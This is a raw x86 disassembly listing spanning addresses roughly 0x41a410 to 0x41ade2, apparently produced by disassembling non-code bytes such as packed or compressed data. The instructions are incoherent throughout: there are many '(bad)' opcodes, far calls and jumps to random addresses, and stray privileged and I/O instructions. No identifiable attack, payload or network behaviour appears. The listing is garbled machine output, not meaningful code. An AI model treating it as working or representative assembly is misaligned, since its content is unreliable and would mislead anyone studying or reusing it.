  41a410:	or     DWORD PTR [edi-0x33],edx
  41a413:	xchg   esp,eax
  41a414:	or     ah,0x7b
  41a417:	add    esi,DWORD PTR [edx+0x18]
  41a41a:	addr16 xor al,0xd
  41a41d:	ja     0x41a41f
	...
  41a43b:	add    ch,cl
  41a43d:	xchg   esp,eax
  41a43e:	mov    ch,BYTE PTR [ecx+0x22]
  41a441:	or     al,BYTE PTR [eax-0x17]
  41a444:	mov    bh,0x46
  41a446:	aaa    
  41a447:	mov    ah,0x8a
  41a449:	or     eax,0x9215694e
  41a44e:	add    BYTE PTR [esi+edx*2+0x22950ad4],bl
  41a455:	aam    0x9
  41a457:	add    BYTE PTR [eax+0x3d],bl
  41a45a:	cmp    al,0x9
  41a45c:	pop    eax
  41a45d:	test   eax,0xa8492639
  41a462:	mov    BYTE PTR [ebp-0x54],al
  41a465:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a466:	les    eax,FWORD PTR [ebx+0x237391ac]
  41a46c:	pop    esi
  41a46d:	xchg   ecx,eax
  41a46e:	gs nop
  41a470:	dec    edx
  41a471:	cmp    al,0x0
  41a473:	(bad)  
  41a474:	call   0xd391a303
  41a479:	mov    eax,ds:0xfbe413ad
  41a47e:	add    al,0x49
  41a481:	stc    
  41a482:	xchg   BYTE PTR [ebp-0x44],al
  41a485:	jg     0x41a4c8
  41a487:	lock imul edx,DWORD PTR [ebx+0x4],0x8684418
  41a48f:	mov    bh,BYTE PTR [edx-0x78]
  41a492:	dec    ecx
  41a493:	clc    
  41a494:	in     al,dx
  41a495:	call   DWORD PTR [edi+edi*8]
  41a498:	sub    DWORD PTR [edi+eax*4+0x7d],esi
  41a49c:	aam    0xd2
  41a49e:	test   BYTE PTR [ebp+0x0],bh
	...
  41a4bd:	add    ah,al
  41a4bf:	mov    dh,0x7a
  41a4c1:	or     BYTE PTR [ebx+0x7f],ah
  41a4c4:	into   
  41a4c5:	(bad)  
  41a4c6:	mov    bl,0x6a
  41a4c8:	pop    esi
  41a4c9:	mov    ebp,DWORD PTR [ecx+0x75]
  41a4cc:	daa    
  41a4cd:	(bad)  
  41a4ce:	aaa    
  41a4cf:	rol    BYTE PTR [edi],cl
  41a4d1:	pop    edi
  41a4d2:	in     eax,dx
  41a4d3:	mov    ebp,0x887a0004
  41a4d8:	lock push edi
  41a4da:	pop    ss
  41a4db:	mov    ebp,0xd0fdff2f
  41a4e0:	and    edx,DWORD PTR [eax]
  41a4e2:	jecxz  0x41a4f6
  41a4e4:	add    DWORD PTR [eax],0xffffffe4
  41a4e7:	cld    
  41a4e8:	dec    esi
  41a4e9:	mov    esp,DWORD PTR [eax+0xd8a0db0]
  41a4ef:	fwait
  41a4f0:	add    al,0x80
  41a4f2:	in     al,0xc6
  41a4f4:	push   cs
  41a4f5:	push   es
  41a4f6:	shl    DWORD PTR [edx+0x79e628d1],cl
  41a4fc:	xor    edi,0x800715fd
  41a502:	les    edx,FWORD PTR [ebx+0xd]
  41a505:	add    ecx,DWORD PTR [ebp+0x1172e39f]
  41a50b:	daa    
  41a50c:	call   0xe4f7:0x81a41e3f
  41a513:	sub    edx,esi
  41a515:	mov    bh,BYTE PTR [esp+eax*4]
  41a518:	cmp    edx,0x7ffcca08
  41a51e:	test   cl,ch
  41a520:	or     al,0x3
	...
  41a53e:	add    BYTE PTR [eax],al
  41a540:	lea    ecx,[edi+0x17]
  41a543:	jbe    0x41a579
  41a545:	or     eax,0x9a67c0b2
  41a54a:	sbb    edi,0x797271a
  41a550:	adc    ah,BYTE PTR [ecx]
  41a552:	sar    dh,0x46
  41a555:	mov    al,es:0xd1658d05
  41a55b:	add    DWORD PTR [edi+0x26],esp
  41a55e:	call   0x47fe:0xbf411207
  41a565:	es lahf 
  41a567:	add    eax,0xc5d0e48d
  41a56c:	adc    edi,esi
  41a56e:	fadd   QWORD PTR [ecx]
  41a570:	cmp    al,0x1e
  41a572:	xor    eax,0x2d0f0c30
  41a577:	xor    BYTE PTR [edi],cl
  41a579:	rol    DWORD PTR es:[edx],0xf6
  41a57d:	call   0x3941:0x663d0c89
  41a584:	jns    0x41a586
  41a586:	retf   
  41a587:	out    dx,eax
  41a588:	add    DWORD PTR [edx-0x70176b5e],eax
  41a58e:	mov    dl,0x34
  41a590:	retf   
  41a591:	add    al,0xe5
  41a593:	add    edi,DWORD PTR [ebx]
  41a595:	ret    0x3ef
  41a598:	test   BYTE PTR [ebx+eax*8+0xb],al
  41a59c:	xor    al,0xc0
  41a59e:	jmp    0xab:0xcb145b43
	...
  41a5c1:	add    BYTE PTR [edi+0x40],ah
  41a5c4:	call   0x64d229cc
  41a5c9:	call   0xfbe9:0x18d5f121
  41a5d0:	int    0x18
  41a5d2:	icebp  
  41a5d3:	sti    
  41a5d4:	into   
  41a5d5:	iret   
  41a5d6:	xchg   ecx,eax
  41a5d7:	(bad)  
  41a5d8:	mov    esi,0xe99b537f
  41a5dd:	(bad)  
  41a5de:	ret    0xa92e
  41a5e1:	cld    
  41a5e2:	jp     0x41a618
  41a5e4:	jb     0x41a586
  41a5e6:	mov    WORD PTR [ebx+ebp*8-0x1510197a],ds
  41a5ed:	sbb    DWORD PTR [ebx],edx
  41a5ef:	(bad)  
  41a5f0:	adc    al,0xf4
  41a5f2:	pop    ecx
  41a5f3:	cmc    
  41a5f4:	stos   BYTE PTR es:[edi],al
  41a5f5:	not    BYTE PTR [edx]
  41a5f7:	add    BYTE PTR [eax+0x49],dh
  41a5fa:	dec    ecx
  41a5fb:	fwait
  41a5fc:	jmp    0x41a584
  41a5fe:	scas   al,BYTE PTR es:[edi]
  41a5ff:	mov    esp,edi
  41a601:	jle    0x41a5d1
  41a603:	div    DWORD PTR [ecx+0x41]
  41a606:	add    DWORD PTR [ebx],esi
  41a608:	mov    ch,0x80
  41a60a:	loope  0x41a603
  41a60c:	popa   
  41a60d:	inc    ecx
  41a60e:	stc    
  41a60f:	or     BYTE PTR [eax],0x4
  41a612:	test   BYTE PTR [eax-0x78498362],ch
  41a618:	add    cl,dl
  41a61a:	jl     0x41a659
  41a61c:	add    BYTE PTR [edx+0x41f80a8d],bl
  41a622:	test   dh,bl
  41a624:	(bad)  
  41a625:	call   0x41a62a
	...
  41a642:	add    BYTE PTR [eax],al
  41a644:	jae    0x41a5ce
  41a646:	xor    DWORD PTR [ebx],edi
  41a648:	fimul  DWORD PTR [eax+0x29d3ac74]
  41a64e:	or     BYTE PTR [ecx+eiz*8-0x526ad2b],dl
  41a655:	cmp    al,BYTE PTR [ecx+0x718dbe7c]
  41a65b:	scas   al,BYTE PTR es:[edi]
  41a65c:	mov    ecx,DWORD PTR [edx]
  41a65e:	adc    bl,ch
  41a660:	and    cl,bh
  41a662:	cmp    BYTE PTR [ebp+ebx*4+0x15],ah
  41a666:	sbb    bl,dh
  41a668:	add    eax,0x5d6518c
  41a66d:	lock cld 
  41a66f:	hlt    
  41a670:	ds icebp 
  41a672:	aas    
  41a673:	jmp    0xf0b565fd
  41a678:	or     eax,DWORD PTR [ebx-0x4]
  41a67b:	imul   edx,DWORD PTR [edx-0x1],0x791c3539
  41a682:	pop    ebx
  41a683:	mov    eax,ds:0x5a72ac43
  41a688:	inc    ebx
  41a689:	dec    esi
  41a68a:	pop    ebp
  41a68b:	aaa    
  41a68c:	xor    al,bh
  41a68e:	ret    0xef9
  41a691:	cmp    DWORD PTR [ebx-0x27],0x72ef130b
  41a698:	aad    0x87
  41a69a:	mov    DWORD PTR [eax*2+0x6160efd7],esp
  41a6a1:	xchg   edi,eax
  41a6a2:	in     eax,0x74
  41a6a4:	or     ch,ch
  41a6a6:	mov    BYTE PTR [edx+0x0],bl
	...
  41a6c5:	add    BYTE PTR [ebx-0x4a],bl
  41a6c8:	jno    0x41a6ff
  41a6ca:	mov    al,ds:0x2e507ffd
  41a6cf:	adc    cl,BYTE PTR [edx]
  41a6d1:	add    BYTE PTR [ebx+edi*2-0x7e0483fb],ah
  41a6d8:	cmc    
  41a6d9:	or     eax,0xfa808bbb
  41a6de:	out    0xf6,al
  41a6e0:	add    ecx,DWORD PTR [ecx+0x42f40890]
  41a6e6:	mov    dl,0xbe
  41a6e8:	in     eax,dx
  41a6e9:	jb     0x41a6ff
  41a6eb:	xchg   dl,bh
  41a6ed:	add    dh,BYTE PTR [esi+0x2a]
  41a6f0:	jg     0x41a76f
  41a6f2:	mov    ah,0x1
  41a6f4:	je     0x41a711
  41a6f6:	aaa    
  41a6f7:	lock sgdtd [eax-0x73]
  41a6fc:	cmp    BYTE PTR [ebp-0x2c],0x3
  41a700:	jno    0x41a714
  41a702:	aas    
  41a703:	(bad)  
  41a705:	inc    ebx
  41a706:	mov    edi,0xc05d8700
  41a70b:	or     eax,DWORD PTR [ecx-0x8]
  41a70e:	out    0x6a,eax
  41a710:	dec    DWORD PTR [edx+0x4d8767e1]
  41a716:	pusha  
  41a717:	lods   al,BYTE PTR ds:[esi]
  41a718:	ror    BYTE PTR [ecx-0x72e4938b],0x58
  41a71f:	nop
  41a720:	mov    bl,BYTE PTR [edi+eiz*2+0x2]
  41a724:	mov    al,BYTE PTR [ebx]
  41a726:	dec    eax
  41a727:	mov    eax,ds:0x871
	...
  41a748:	cmp    BYTE PTR [edx-0x71b7f887],cl
  41a74e:	jl     0x41a753
  41a750:	daa    
  41a751:	imul   ebp,ebx,0xffffff8b
  41a754:	icebp  
  41a755:	xchg   DWORD PTR [eax],ebp
  41a757:	retf   
  41a758:	lods   eax,DWORD PTR ds:[esi]
  41a759:	mov    ecx,DWORD PTR [eax-0x525723d]
  41a75f:	jmp    FWORD PTR [ebx+0x65ec86d4]
  41a765:	rcl    BYTE PTR [ebp+0x57],cl
  41a768:	or     eax,0x1a101536
  41a76d:	xchg   esp,eax
  41a76e:	lds    edx,FWORD PTR [edx]
  41a770:	int    0x96
  41a772:	jl     0x41a7e7
  41a774:	adc    eax,0x96f84510
  41a779:	pop    ebx
  41a77a:	std    
  41a77b:	mov    bh,BYTE PTR [ecx]
  41a77d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a77e:	int3   
  41a77f:	hlt    
  41a780:	jle    0x41a7e1
  41a782:	xor    al,0x89
  41a784:	shl    BYTE PTR [ecx-0x5e88af39],cl
  41a78a:	aaa    
  41a78b:	std    
  41a78c:	add    BYTE PTR [edi-0x9],bh
  41a78f:	aas    
  41a790:	or     eax,0x940cc81a
  41a795:	arpl   WORD PTR [ebp+0x60bcd83],cx
  41a79b:	xchg   DWORD PTR [eax],edi
  41a79d:	fwait
  41a79e:	pushf  
  41a79f:	add    DWORD PTR [edx+0x48898fdb],esi
  41a7a5:	stos   DWORD PTR es:[edi],eax
  41a7a6:	(bad)  
  41a7a8:	mov    ?,WORD PTR [ecx+0x7402]
	...
  41a7ca:	dec    ecx
  41a7cb:	sbb    cl,BYTE PTR [edx+eax*1+0x3e819c18]
  41a7d2:	sbb    bl,dl
  41a7d4:	inc    ebp
  41a7d5:	mov    eax,ecx
  41a7d7:	dec    esi
  41a7d8:	jle    0x41a822
  41a7da:	or     al,0x92
  41a7dc:	stos   BYTE PTR es:[edi],al
  41a7dd:	jbe    0x41a81b
  41a7df:	pop    ss
  41a7e0:	int    0x5
  41a7e2:	daa    
  41a7e3:	hlt    
  41a7e4:	fimul  DWORD PTR [edi-0x45]
  41a7e7:	jne    0x41a7ff
  41a7e9:	adc    BYTE PTR [edx-0x6d],bl
  41a7ec:	push   ecx
  41a7ed:	adc    ebp,ecx
  41a7ef:	xchg   esi,eax
  41a7f0:	xchg   al,al
  41a7f2:	shr    BYTE PTR [edx-0x12be8524],0x8e
  41a7f9:	jae    0x41a834
  41a7fb:	hlt    
  41a7fc:	mov    ss,WORD PTR [ebx]
  41a7fe:	sar    edi,0xfc
  41a801:	inc    ebx
  41a802:	or     eax,0x95ffbbd7
  41a807:	or     bl,bh
  41a809:	test   BYTE PTR [ecx-0x5],dl
  41a80c:	jmp    0xeadaa91f
  41a811:	jl     0x41a891
  41a813:	mov    WORD PTR [edx],es
  41a815:	cdq    
  41a816:	jg     0x41a88e
  41a818:	xchg   edx,eax
  41a819:	jl     0x41a869
  41a81b:	cld    
  41a81c:	lea    esi,[ecx]
  41a81e:	retf   0xf3be
  41a821:	add    edi,DWORD PTR [esi]
  41a823:	ja     0x41a830
  41a825:	test   cl,dh
  41a827:	lock mov ecx,0xf315d839
  41a82d:	jl     0x41a82f
	...
  41a84b:	add    BYTE PTR [esi],bl
  41a84d:	(bad)  
  41a84e:	fld    DWORD PTR [ebx+0xd]
  41a851:	mov    edx,DWORD PTR ds:0x5ff03e90
  41a857:	inc    esi
  41a858:	mov    ecx,0x467c158b
  41a85d:	cld    
  41a85e:	outs   dx,DWORD PTR ds:[esi]
  41a85f:	dec    ecx
  41a860:	popf   
  41a861:	ja     0x41a887
  41a863:	cld    
  41a864:	xchg   edi,eax
  41a865:	aam    0xde
  41a867:	jp     0x41a81e
  41a869:	jns    0x41a897
  41a86b:	cwde   
  41a86c:	aam    0xc1
  41a86e:	test   BYTE PTR [edx+0x3e700ac],0xd8
  41a875:	cs adc DWORD PTR fs:[ecx+0x73dfa598],eax
  41a87d:	mov    esi,DWORD PTR [eax+0x49]
  41a880:	test   DWORD PTR gs:[edi-0x18827101],esp
  41a887:	add    ecx,DWORD PTR ds:0x14940c77
  41a88d:	ret    
  41a88e:	std    
  41a88f:	or     ah,al
  41a891:	cs jle 0x41a8ad
  41a894:	sbb    eax,0xdedc008b
  41a899:	lock aas 
  41a89b:	jmp    0xd5b56925
  41a8a0:	mov    cs,esp
  41a8a2:	cmp    BYTE PTR [ebx],ah
  41a8a4:	add    al,0x22
  41a8a6:	mov    DWORD PTR [esi+eax*4+0x37a6c901],esp
  41a8ad:	call   0x0:0x1274
	...
  41a8cc:	add    BYTE PTR [eax],al
  41a8ce:	xchg   BYTE PTR [edi],ch
  41a8d0:	cld    
  41a8d1:	jb     0x41a89d
  41a8d3:	jle    0x41a8a7
  41a8d5:	mov    ebp,0xd6447712
  41a8da:	or     ecx,ecx
  41a8dc:	inc    edx
  41a8dd:	and    DWORD PTR [ebx],eax
  41a8df:	test   DWORD PTR [esi+0x6c],0x2788f2e5
  41a8e6:	jns    0x41a8ab
  41a8e8:	ds call 0x7a4e41fc
  41a8ee:	les    esi,FWORD PTR [edi+ecx*2]
  41a8f1:	jmp    0x89cb:0x56e82fcf
  41a8f8:	std    
  41a8f9:	push   0x1c
  41a8fb:	mov    WORD PTR [eax],es
  41a8fd:	pop    edi
  41a8fe:	mov    ds:0xc8dd738b,al
  41a903:	add    ebx,DWORD PTR ds:0x140e8a09
  41a909:	mov    WORD PTR es:[ebx],es
  41a90c:	sbb    eax,0x3e7ea919
  41a911:	call   0xb5bcaa24
  41a916:	idiv   DWORD PTR [esi]
  41a918:	or     BYTE PTR [edx],al
  41a91a:	cdq    
  41a91b:	add    ch,dh
  41a91d:	sar    ch,cl
  41a91f:	xchg   DWORD PTR [ecx],eax
  41a921:	call   0x8a7e:0xea0c0ee1
  41a928:	jl     0x41a8bf
  41a92a:	xlat   BYTE PTR ds:[ebx]
  41a92b:	es hlt 
  41a92d:	add    BYTE PTR [edi+0x5c],cl
  41a930:	or     eax,DWORD PTR [edx+0x0]
	...
  41a94e:	add    BYTE PTR [eax],al
  41a950:	and    edi,DWORD PTR [ebx-0x5]
  41a953:	jmp    DWORD PTR [ebx]
  41a955:	pop    es
  41a956:	inc    ecx
  41a957:	or     al,0x2
  41a959:	xlat   BYTE PTR ds:[ebx]
  41a95a:	(bad)
  41a95e:	push   eax
  41a95f:	mov    edx,eax
  41a961:	ror    DWORD PTR [esi+0x56],cl
  41a964:	scas   eax,DWORD PTR es:[edi]
  41a965:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a966:	rcl    DWORD PTR [edx],0x64
  41a969:	(bad)  
  41a96a:	push   edx
  41a96b:	dec    ecx
  41a96d:	mov    esp,edi
  41a96f:	(bad)  
  41a970:	inc    ebx
  41a971:	call   0x7a7e347d
  41a976:	(bad)  
  41a977:	test   DWORD PTR [ebx],esp
  41a979:	sti    
  41a97a:	bound  eax,QWORD PTR [ebp+0x6a5efb34]
  41a980:	ret    
  41a981:	jp     0x41a9f4
  41a983:	or     BYTE PTR [ebx],al
  41a985:	mov    BYTE PTR [ecx+0x13],ch
  41a988:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a989:	std    
  41a98a:	add    al,0x48
  41a98d:	sar    DWORD PTR [edi],1
  41a98f:	push   eax
  41a990:	cmp    eax,0x1aff0838
  41a995:	or     al,0x41
  41a997:	cld    
  41a998:	push   ecx
  41a999:	inc    ecx
  41a99a:	cmp    BYTE PTR [edx],al
  41a99c:	cmp    esp,eax
  41a99e:	je     0x41a9e2
  41a9a0:	mov    esp,0xa401391f
  41a9a5:	or     al,bl
  41a9a7:	test   DWORD PTR [edi-0x18],ebx
  41a9aa:	xor    dl,BYTE PTR [edi+0x53]
  41a9ad:	icebp  
  41a9ae:	or     edx,DWORD PTR [ebx+0x5c]
  41a9b1:	(bad)  
  41a9b2:	cmp    eax,0x1
	...
  41a9cf:	add    BYTE PTR [eax],al
  41a9d1:	add    BYTE PTR [edi+eiz*8+0x3a],ah
  41a9d5:	(bad)  
  41a9d6:	cmp    DWORD PTR [eax],eax
  41a9d8:	sti    
  41a9d9:	adc    eax,0x3d8f00
  41a9de:	xor    ecx,0x7
  41a9e1:	test   DWORD PTR ds:0x4d92fb57,ecx
  41a9e7:	jns    0x41a9a5
  41a9e9:	and    al,0x24
  41a9eb:	adc    al,0x0
  41a9ed:	cmp    DWORD PTR [ecx],ecx
  41a9ef:	sar    DWORD PTR [ecx-0x1],0x87
  41a9f3:	fmul   QWORD PTR [edi-0x66684375]
  41a9f9:	aaa    
  41a9fa:	lock xchg edi,eax
  41a9fc:	add    DWORD PTR [ecx-0x305d1b2],ecx
  41aa02:	mov    al,ds:0x25c578a2
  41aa07:	and    ch,ah
  41aa09:	dec    BYTE PTR [edx]
  41aa0b:	bound  ebp,QWORD PTR [ebx]
  41aa0d:	pop    ecx
  41aa0e:	aam    0xd4
  41aa10:	sti    
  41aa11:	jmp    DWORD PTR [ecx+0x1e]
  41aa14:	mov    al,ds:0x2a6e17f
  41aa19:	add    BYTE PTR ds:0x77553346,cl
  41aa1f:	mov    eax,ds:0xd935f078
  41aa24:	inc    esp
  41aa25:	stc    
  41aa26:	or     eax,0x1a0846b0
  41aa2b:	sbb    DWORD PTR [ecx+0x0],edi
  41aa2e:	or     eax,0x95683197
  41aa33:	or     BYTE PTR [ecx+0x0],al
	...
  41aa52:	add    BYTE PTR [eax],al
  41aa54:	xchg   al,ch
  41aa56:	fwait
  41aa57:	sbb    esi,esi
  41aa59:	xchg   edi,eax
  41aa5a:	add    DWORD PTR [ebx-0x74f3cc33],eax
  41aa60:	push   ebx
  41aa61:	cdq    
  41aa62:	ja     0x41aa6c
  41aa64:	lea    ebp,[edi+0x171773e1]
  41aa6a:	mov    al,BYTE PTR [edi]
  41aa6c:	add    DWORD PTR [edi-0x2df7087f],ecx
  41aa72:	(bad)  
  41aa73:	aas    
  41aa74:	dec    dx
  41aa76:	fsubr  st,st(7)
  41aa78:	push   cs
  41aa79:	add    BYTE PTR [esp+edi*8],bl
  41aa7c:	xchg   edi,eax
  41aa7d:	sub    ch,bh
  41aa7f:	xor    eax,0x935c7abd
  41aa84:	push   ebx
  41aa85:	mov    BYTE PTR [esi-0x7a70713c],cl
  41aa8b:	mov    WORD PTR [eax-0x4],es
  41aa8e:	out    0x3,al
  41aa90:	or     eax,0x30be0a98
  41aa95:	mov    BYTE PTR [edx-0x55],ah
  41aa98:	mov    fs,WORD PTR [ebx+ebx*8-0x463a4b31]
  41aa9f:	mov    esi,?
  41aaa1:	sbb    edi,edx
  41aaa3:	inc    ebx
  41aaa4:	or     eax,0x8864f75
  41aaa9:	or     eax,0x99c3310e
  41aaae:	cmp    al,0x3
  41aab0:	or     eax,0xe53529db
  41aab5:	in     al,dx
  41aab6:	or     DWORD PTR [ebx],eax
	...
  41aad4:	add    BYTE PTR [eax],al
  41aad6:	or     eax,0x49ffb47b
  41aadb:	das    
  41aadc:	jo     0x41aae0
  41aade:	inc    ebx
  41aadf:	sbb    DWORD PTR [edi],0xffffff8c
  41aae2:	in     eax,0xfc
  41aae4:	leave  
  41aae5:	add    cl,BYTE PTR ds:0x8bf3b47b
  41aaeb:	add    DWORD PTR ds:0x9a01b446,esp
  41aaf1:	fwait
  41aaf2:	rol    ah,cl
  41aaf4:	out    0x3,eax
  41aaf6:	xchg   edi,eax
  41aaf7:	cmp    eax,0x2b432be2
  41aafc:	mov    al,0xc6
  41aafe:	or     DWORD PTR [eax],eax
  41ab00:	bound  eax,QWORD PTR [ebp+0x39]
  41ab03:	add    esp,DWORD PTR [ebx]
  41ab05:	loopne 0x41ab19
  41ab07:	(bad)
  41ab0a:	lods   eax,DWORD PTR ds:[esi]
  41ab0b:	add    BYTE PTR [esi],dh
  41ab0d:	jmp    0x3d4231f3
  41ab12:	ins    DWORD PTR es:[edi],dx
  41ab13:	sti    
  41ab14:	mov    dh,BYTE PTR [eax]
  41ab16:	and    DWORD PTR [ebp-0x7ba5328c],eax
  41ab1c:	jne    0x41ab03
  41ab1e:	jbe    0x41aaac
  41ab20:	fist   WORD PTR [esi-0x567cda7a]
  41ab26:	sbb    eax,0xa3e8affc
  41ab2b:	add    dh,BYTE PTR [edx]
  41ab2d:	test   eax,0x2fff853
  41ab32:	or     BYTE PTR [ecx-0x48792641],al
  41ab38:	popa   
  41ab39:	jmp    0x41ab3e
	...
  41ab56:	add    BYTE PTR [eax],al
  41ab58:	push   cs
  41ab59:	push   eax
  41ab5a:	jmp    FWORD PTR [ecx]
  41ab5c:	fistp  QWORD PTR [eax-0x11]
  41ab5f:	push   esi
  41ab60:	jmp    FWORD PTR [edi]
  41ab62:	call   0xfdc780c5
  41ab67:	aas    
  41ab68:	dec    ebp
  41ab69:	fadd   QWORD PTR [edi]
  41ab6b:	call   0x6421a93f
  41ab70:	dec    ecx
  41ab71:	add    BYTE PTR [edi+eiz*8+0x1c],dh
  41ab75:	cwde   
  41ab76:	jl     0x41ab5d
  41ab78:	or     DWORD PTR [eax],eax
  41ab7a:	mov    DWORD PTR [edi],esp
  41ab7c:	daa    
  41ab7d:	ret    0xe904
  41ab80:	sbb    eax,0x6d6aec79
  41ab85:	xchg   DWORD PTR [edi+0x15],edi
  41ab88:	(bad)
  41ab8b:	call   0x2972d993
  41ab90:	(bad)  
  41ab91:	aas    
  41ab92:	mov    ebp,DWORD PTR [ebp-0x36]
  41ab95:	(bad)  
  41ab96:	mov    al,al
  41ab98:	xchg   BYTE PTR [ebp-0x8],ah
  41ab9b:	jmp    0xaf017cae
  41aba0:	rcr    bl,cl
  41aba2:	das    
  41aba3:	sbb    DWORD PTR [eax+eax*2],0x6fd0000
  41abaa:	and    al,0x80
  41abac:	add    al,BYTE PTR fs:[eax]
  41abaf:	mov    eax,esp
  41abb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abb2:	add    DWORD PTR [eax],0x84850274
  41abb8:	push   eax
  41abb9:	or     al,BYTE PTR [eax]
	...
  41abd7:	add    BYTE PTR [eax],al
  41abd9:	add    BYTE PTR [ecx+eax*8-0x7c],ah
  41abdd:	and    al,0xe8
  41abdf:	add    al,BYTE PTR [eax]
  41abe1:	add    BYTE PTR [ebx+edi*8],dh
  41abe4:	(bad)  
  41abe5:	(bad)  
  41abe6:	mov    edi,0x258b0fc5
  41abeb:	pop    es
  41abec:	ja     0x41abf6
  41abee:	adc    ecx,DWORD PTR [ecx]
  41abf0:	push   esp
  41abf1:	and    al,0x58
  41abf3:	int3   
  41abf4:	xchg   BYTE PTR [ebx+0x30],dl
  41abf7:	cmp    al,0x52
  41abf9:	(bad)  
  41abfa:	jo     0x41aba2
  41abfc:	sbb    BYTE PTR [eax],al
  41abfe:	mov    ebx,0x348403d2
  41ac03:	mov    al,BYTE PTR [ecx+0x1f67d]
  41ac09:	lea    esi,[eax-0x31afe65b]
  41ac0f:	add    DWORD PTR [edx+0x1],ebp
  41ac12:	cmp    esi,ebp
  41ac14:	and    esp,DWORD PTR [esp+edi*8]
  41ac17:	in     al,0x69
  41ac19:	add    ah,ah
  41ac1b:	add    al,0x44
  41ac1d:	and    al,0xd4
  41ac1f:	push   es
  41ac20:	inc    esp
  41ac21:	and    al,0xbc
  41ac23:	push   es
  41ac24:	or     BYTE PTR [ebx+0x4b869d7d],cl
  41ac2a:	test   al,0x7a
  41ac2c:	xor    BYTE PTR [ebx+0x3bdd6ab4],cl
  41ac32:	mov    ch,0x1
  41ac34:	push   esi
  41ac35:	call   0x406009
  41ac3a:	daa    
  41ac3b:	clc    
  41ac3c:	and    edx,DWORD PTR [eax]
	...
  41ac5a:	add    BYTE PTR [eax],al
  41ac5c:	or     eax,0xcc83f897
  41ac61:	cwde   
  41ac62:	add    DWORD PTR [eax],eax
  41ac64:	(bad)  
  41ac65:	inc    BYTE PTR [ebx]
  41ac67:	mov    edi,ecx
  41ac69:	cli    
  41ac6a:	fbstp  TBYTE PTR [edi+0x197a8]
  41ac70:	loopne 0x41ac09
  41ac72:	inc    ecx
  41ac73:	call   0x4604b1
  41ac78:	mov    BYTE PTR [ebx],ah
  41ac7a:	loopne 0x41ac3b
  41ac7c:	or     eax,0x71b80197
  41ac81:	xchg   edi,eax
  41ac82:	add    DWORD PTR [eax],eax
  41ac84:	xor    eax,0xd00c15a
  41ac89:	adc    al,0x50
  41ac8b:	and    al,0xe7
  41ac8d:	xchg   edi,eax
  41ac8e:	add    DWORD PTR [eax],eax
  41ac90:	xor    eax,0x22fd9b3f
  41ac95:	push   ds
  41ac96:	adc    al,0x7c
  41ac98:	mov    BYTE PTR [ebx-0x23],bl
  41ac9b:	daa    
  41ac9c:	adc    ah,BYTE PTR [ebx+0x225d13dd]
  41aca2:	mov    edi,0xdd529050
  41aca7:	das    
  41aca8:	pop    ebp
  41aca9:	adc    al,0x40
  41acab:	and    al,0x25
  41acad:	addr16 cdq 
  41acaf:	push   ss
  41acb0:	adc    ebx,DWORD PTR [eax-0x1367eff]
  41acb6:	jl     0x41ac78
  41acb8:	or     cl,BYTE PTR [esi+eax*8]
  41acbb:	mov    bh,0xe3
  41acbd:	xchg   edi,eax
  41acbe:	add    DWORD PTR [eax],eax
	...
  41acdc:	add    BYTE PTR [eax],al
  41acde:	xchg   esi,eax
  41acdf:	fadd   st(1),st
  41ace1:	add    BYTE PTR ds:0xb4733a57,cl
  41ace7:	adc    DWORD PTR ds:0xce88908,ecx
  41aced:	inc    esp
  41acee:	stos   BYTE PTR es:[edi],al
  41acef:	or     esi,ecx
  41acf1:	mov    BYTE PTR [ecx+0x0],cl
  41acf4:	or     esp,eax
  41acf6:	in     eax,0x3b
  41acf8:	add    ebp,esp
  41acfa:	xchg   ecx,eax
  41acfb:	or     ah,bl
  41acfd:	jl     0x41ace0
  41acff:	fucomi st,st(2)
  41ad01:	jl     0x41ad56
  41ad03:	xchg   edi,eax
  41ad04:	lods   al,BYTE PTR ds:[esi]
  41ad05:	fwait
  41ad06:	or     eax,0xf9c36300
  41ad0b:	in     eax,0xb5
  41ad0d:	push   cs
  41ad0e:	std    
  41ad0f:	js     0x41ad34
  41ad11:	loopne 0x41ad11
  41ad13:	test   BYTE PTR [eax+edi*8],bl
  41ad16:	test   DWORD PTR [ebx],ebp
  41ad18:	ret    
  41ad19:	fild   WORD PTR [ebp+0x35577fb5]
  41ad1f:	jmp    esi
  41ad21:	jg     0x41ad70
  41ad23:	or     ebp,esp
  41ad25:	rcl    ecx,0xdb
  41ad28:	in     eax,dx
  41ad29:	add    dh,BYTE PTR [eax]
  41ad2b:	or     ecx,ebx
  41ad2d:	out    dx,eax
  41ad2e:	xor    bl,bh
  41ad30:	mov    cl,0x2
  41ad32:	or     eax,0xf6dfdb85
  41ad37:	xchg   edi,eax
  41ad38:	test   ah,0x13
  41ad3b:	test   BYTE PTR [edi+0x7],ah
  41ad3e:	xor    ebx,esi
  41ad40:	out    0xf8,al
	...
  41ad5e:	add    BYTE PTR [eax],al
  41ad60:	mov    es,WORD PTR ds:0x990d03e8
  41ad66:	xchg   BYTE PTR [ebx],al
  41ad68:	or     eax,0x317f3d00
  41ad6d:	ins    BYTE PTR es:[edi],dx
  41ad6e:	out    0x3,eax
  41ad70:	or     eax,0x8df99b01
  41ad75:	inc    esp
  41ad76:	ret    
  41ad77:	imul   ecx,DWORD PTR ds:0x1803e700,0x7d
  41ad7e:	xchg   DWORD PTR [edx],eax
  41ad80:	or     eax,0xf17efd00
  41ad85:	imul   esp,edi,0x3
  41ad88:	or     eax,0xa47cffe0
  41ad8d:	cmp    BYTE PTR [ebp+eax*8-0x16ffffc6],0xe
  41ad95:	cmc    
  41ad96:	xor    BYTE PTR [ecx],0x8
  41ad99:	add    BYTE PTR [eax],al
  41ad9b:	xchg   esi,eax
  41ad9c:	adc    eax,edi
  41ad9e:	(bad)  
  41ad9f:	call   0x3e3eeb4b
  41ada4:	ins    DWORD PTR es:[edi],dx
  41ada5:	repz mov ah,BYTE PTR [ebp+0x6d]
  41ada9:	out    0x0,eax
  41adab:	jmp    0x25ccddbe
  41adb0:	ins    DWORD PTR es:[edi],dx
  41adb1:	sbb    edx,DWORD PTR [eax+0x74]
  41adb4:	int    0xdb
  41adb6:	dec    ebx
  41adb7:	xchg   ecx,eax
  41adb8:	enter  0x31,0xe9
  41adbc:	push   edi
  41adbd:	aas    
  41adbe:	and    al,0xf9
  41adc0:	cmp    edi,DWORD PTR [esi+0x1b]
  41adc3:	call   0x41adc8
	...
  41ade0:	add    BYTE PTR [eax],al
  41ade2:	push   cs
